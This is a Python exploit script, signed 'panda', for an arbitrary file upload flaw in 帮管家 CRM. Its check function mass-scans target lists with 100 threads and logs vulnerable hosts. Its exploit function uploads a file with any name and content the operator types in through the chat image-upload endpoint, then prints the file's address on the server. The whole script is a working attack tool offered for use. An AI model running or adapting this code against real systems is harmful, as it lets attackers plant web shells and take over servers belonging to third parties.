import sys,argparse,requests,json
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                      author:panda
                      type: 帮管家-CRM-存在任意文件上传漏洞
                      date:2024-09-2
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="帮管家-CRM-存在任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/index.php/upload/ajax_upload_chat?type=image"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryP85wZUzxCEb9PRNl"
    }
    data = """------WebKitFormBoundaryP85wZUzxCEb9PRNl
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: image/jpeg

test
------WebKitFormBoundaryP85wZUzxCEb9PRNl--
    """
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    res1 = requests.get(url=target,verify=False,timeout=5)
    try:
        res2 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if res1.status_code == 200 and res2.status_code == 200:
            if "login" in res2.text or "html" in res2.text:
                print(f"[-]{target}不存在任意文件上传漏洞")
            else:
                res3 = json.loads(res2.text)
                if res3['code'] == 0:
                    with open("result.txt","a",encoding="utf-8") as f:
                        f.write(f"[+]{target}存在任意文件上传漏洞\n")
                        f.close()
                        print(f"[+]{target}存在任意文件上传漏洞")
                        return True
        else:
            print(f"网站{target}访问超时，请手工测试！！")
    except Exception as e:
        print(e)
def exp(target):
    payload = "/index.php/upload/ajax_upload_chat?type=image"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryP85wZUzxCEb9PRNl"
    }
    filename = input("请输入文件名：")
    txt = input("请输入文件内容：")
    data = f"""------WebKitFormBoundaryP85wZUzxCEb9PRNl
Content-Disposition: form-data; name="file"; filename="{filename}"
Content-Type: image/jpeg

{txt}
------WebKitFormBoundaryP85wZUzxCEb9PRNl--
        """
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    res1 = requests.get(url=target, verify=False, timeout=5)
    try:
        res2 = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=5,proxies=proxies)
        res3 = json.loads(res2.text)
        if "upload" in res3["data"]["src"]:
            print(f"上传成功\n地址为\n{target}"+res3["data"]["src"])

    except Exception as e:
        print(e)





if __name__ == '__main__':
    main()